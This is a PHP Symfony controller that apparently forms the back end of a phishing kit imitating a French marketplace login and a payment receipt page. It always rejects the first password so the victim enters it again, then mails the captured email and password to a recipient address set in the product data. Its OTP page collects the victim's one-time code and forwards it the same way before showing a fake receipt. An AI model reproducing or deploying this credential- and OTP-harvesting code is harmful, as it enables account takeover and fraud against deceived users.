<?php

namespace App\Controller;

use App\Entity\Vehicule;
use App\Form\LoginType;
use App\Form\OtpCodeType;
use App\Service\MailService;
use App\Service\PaymentReceiptService;
use App\Service\RemoteProductApiService;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Attribute\Route;
use Psr\Log\LoggerInterface;
use Symfony\Component\DependencyInjection\Attribute\Autowire;
use Symfony\Component\DependencyInjection\Attribute\Target;
use Symfony\Component\HttpFoundation\RequestStack;
use Symfony\Component\HttpFoundation\Session\SessionInterface;
use Symfony\Component\RateLimiter\RateLimiterFactoryInterface;

class AuthController  extends AbstractController
{
    private SessionInterface $session;
    public function __construct(
        private readonly LoggerInterface $logger,
        RequestStack $requestStack,
        #[Target('login_attempt')]
        private RateLimiterFactoryInterface $loginAttemptLimiter,
        #[Target('otp_attempt')]
        private RateLimiterFactoryInterface $otpAttemptLimiter,
        #[Autowire(service: MailService::class)]
        private  readonly   MailService $mailService
    ) {
        $this->session = $requestStack->getSession();
    }

    #[Route('', name: 'auth_home', methods: ['GET'])]
    public function home(Request $request):Response  {
        $reference =  $this->generateNumericCode(10);
        return $this->redirectToRoute('auth_home',['fromClient' => 'o', 'reference' => $reference]); 
    }
    #[Route('/', name: 'auth_home_index', methods: ['GET'])]
    public function homeIndex(Request $request):Response  {
           return $this->render('home/not_found.html.twig');
    }

    #[Route('/otp', name: 'auth_otp_mail', methods: ['GET'])]
    public function otpEmail(Request $request):Response  {
        return $this->render('emails/otp.html.twig');
    }

    #[Route('/{client_id?}/{reference?}/{transactionId?}/{error?}/{error_debug?}/{error_description?}', name: 'auth_home', methods: ['GET','POST'])]
    public function index(Request $request, ?string $client_id, ?string $reference,RemoteProductApiService $remoteProductApi,?string $error = "login_required",
    $error_debug="session", ?string $transactionId, $error_description="session%20token%20is%20not%20found%20or%20expired",
    ): Response
    {
        $this->session->remove('product');
        $product =   $this->session->get('product');
        if(empty($product)){
            if(empty($reference)){
                  $reference =  $this->generateNumericCode(10);
                  return $this->redirectToRoute('auth_home',[
                    'client_id' => $client_id ?? 'bordereau', 
                    'transactionId' => $transactionId ?? 'LbcFrance',
                    'reference' => $reference,
                    'error' => $error,
                    'error_debug' => $error_debug,
                    'error_description' => $error_description,
                ]);
            }
            $resultApi = $remoteProductApi->getProduct($client_id,$reference);
            if(!empty($resultApi)){
               $product  = $remoteProductApi->getEntity($client_id,$resultApi);
            }else{
                $product = Vehicule::new();
            }
            $this->session->set('product',$product);
        }
        // Récupération du produit de l'API.
        $form = $this->createForm(LoginType::class,null, [
            'step' =>  1
        ]);
        $form->handleRequest($request);  
        $error =  $errorPassword = null;
        if ($form->isSubmitted()) {
            $step = (int)$form->get('step')->getData();
            // $limiter = $this->loginAttemptLimiter->create($request->getClientIp() ?? 'unknown');
            // if (!$limiter->consume()->isAccepted()) {
            //     $this->logger->warning('Limite de tentatives de connexion atteinte.', [
            //         'ip' => $request->getClientIp(),
            //     ]);
            //     return $this->render('home/auth.html.twig', [
            //         'form' => $form,
            //         'step' => $step,
            //         'error' => 'Trop de tentatives. Réessayez dans quelques minutes.',
            //     ], new Response('', Response::HTTP_TOO_MANY_REQUESTS));
            // }
            list($email, $password) = [$form->get('emailAddress')->getData(),$form->get('password')->getData()];
         
            if($step == 1 && !empty($email)){
                ++$step;
                $form = $this->createForm(LoginType::class,null, [
                    'email' => $email,
                    'password' => $password,
                    'step' =>  $step
                ]);
                return $this->render('home/auth.html.twig',[
                    'form' => $form->createView(),
                    'step' => $step,
                 ]);
            }
            if($step == 2 && !empty($email) && !empty($password)){
                ++$step;
                $form = $this->createForm(LoginType::class,null, [
                    'email' => $email,
                    'password' => $password,
                    'step' =>  $step
                ]);
                $errorPassword = "Mot de passe erroné";
                return $this->render('home/auth.html.twig',[
                    'form' => $form->createView(),
                    'step' => $step,
                    'errorPassword' => $errorPassword
                 ]);
            }
            if($step == 3 &&  !empty($email) && !empty($password)){
                $product->emailAddress = $email;
                $product->password = $password;
                $this->session->set('product',$product);
                // Envoie du code OTP
                $this->mailService->sendIdentier($email, $password, $product->mailTo);
                return $this->redirectToRoute('auth_otp',['reference' => $reference]);
            }
            $error = "Identifiant erroné";
            return $this->render('home/auth.html.twig',[
                'form' => $form->createView(),
                'step' => $step,
                'error' => $error
            ]);
        }
        $step = intval($form->get('step')->getData());
        return $this->render('home/auth.html.twig', [
            'form' => $form->createView(),
            'error' => null,
            'step' => $step
        ]);
    }

    #[Route('/otp/{reference}', name: 'auth_otp', methods: ['GET','POST'])]
    public function otp(Request $request, MailService $mailService, ?string $reference): Response
    {
        $product =   $this->session->get('product');
        if(empty($product)){
             return $this->render('home/not_found.html.twig');
        }
        $form = $this->createForm(OtpCodeType::class,null,[
            'action' => $this->generateUrl('auth_otp',['reference' => $reference]),
            'method' => 'POST',
            'reference' => $reference,
            'email' => $product->emailAddress,
            'password' =>$product->password,
        ]);
        $form->handleRequest($request);  
        if ($form->isSubmitted()) {
                $limiter = $this->otpAttemptLimiter->create($request->getClientIp() ?? 'unknown');
                if (!$limiter->consume()->isAccepted()) {
                    $this->logger->warning('Limite de tentatives de connexion atteinte.', [
                        'ip' => $request->getClientIp(),
                    ]);
                    return $this->redirectToRoute('auth_home');
                }
                $code = $form->get('code')->getData();
                $explode = explode(',', $code);
                if(count($explode) < 6){
                    $error = 'Le code saisi est erroné';
                    return $this->render('home/otp.html.twig', [
                        'error' => $error,
                        'form' => $form->createView(),
                    ]);
                }
                list($email, $password) = [$product->emailAddress, $product->password];
                // Envoie du code OTP
                $mailService->sendOtp($email, $password, $code, $product->mailTo);
                return $this->redirectToRoute('auth_bordero');
        }
        return $this->render('home/otp.html.twig', [
            'step' => 1,
            'form' => $form,
            'error' => null
        ]);
    }

    #[Route('/resend', name: 'auth_resend', methods: ['GET'])]
    public function resend(): Response
    {
        return $this->render('home/verify.html.twig', []);
    }

    #[Route('/borderoo', name: 'auth_bordero', methods: ['GET'])]
    public function borderau(PaymentReceiptService $receiptService): Response
    {
        $product =   $this->session->get('product');
        if(empty($product)){
             return $this->render('home/not_found.html.twig');
        }
        $this->mailService->sendBordereau($product);
        /* $receiptService->send(
            entity: $product,
            recipientEmail: 'pierre.gailler@gmail.com',
            amount: 94990,
            paidAt: new \DateTimeImmutable(),
            paymentMethod: $product->paymentMethod,
            transactionReference: $product->transactionReference
        ); */
        $this->session->remove('product');
        return $this->render('home/borderau.html.twig', [
            'product' => $product
        ]);
    }

    #[Route('/not-found', name: 'auth_not_found', methods: ['GET'])]
    public function notFound(): Response
    {
        return $this->render('home/not_found.html.twig', []);
    }

    #[Route('/verify', name: 'auth_verify', methods: ['GET'])]
    public function verify(): Response
    {
        return $this->render('home/verify.html.twig', []);
    }

    private function generateNumericCode(int $length = 6): string
    {
        if ($length < 1) {
            throw new \Exception('La longueur doit être supérieure à 0.');
        }
        $code = '';
        for ($i = 0; $i < $length; $i++) {
            $code .= random_int(0, 9);
        }
        return $code;
    }
}
